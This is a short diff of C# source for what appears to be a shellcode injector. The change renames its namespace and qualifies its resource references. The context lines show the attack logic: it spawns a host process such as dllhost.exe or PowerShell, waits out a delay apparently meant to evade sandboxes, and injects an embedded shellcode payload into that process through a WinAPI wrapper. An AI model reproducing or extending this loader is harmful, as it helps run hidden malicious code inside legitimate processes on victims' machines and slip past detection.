@@ -10,7 +10,7 @@ using System.Threading.Tasks;
 using WinAPI;
 using WinAPI.Wrapper;
 
-namespace Inject
+namespace EntryPoint
 {
     public class Entry
     {
@@ -30,7 +30,7 @@ namespace Inject
 
             try
             {
-                var app = Properties.Resources.Host;
+                var app = Inject.Properties.Resources.Host;
                 //app = @"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe";
                 //app = @"c:\windows\system32\dllhost.exe";
 
@@ -48,7 +48,7 @@ namespace Inject
                 //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} version 2.3{Environment.NewLine}");
 
                 int delay = 60;
-                int.TryParse(Properties.Resources.Delay, out delay);
+                int.TryParse(Inject.Properties.Resources.Delay, out delay);
 
                 Thread.Sleep(delay * 1000);
 
@@ -72,7 +72,7 @@ namespace Inject
                 Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");
 #endif
 
-                byte[] shellcode = Properties.Resources.Payload;
+                byte[] shellcode = Inject.Properties.Resources.Payload;
 
                 wrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, injectMethod);
             }
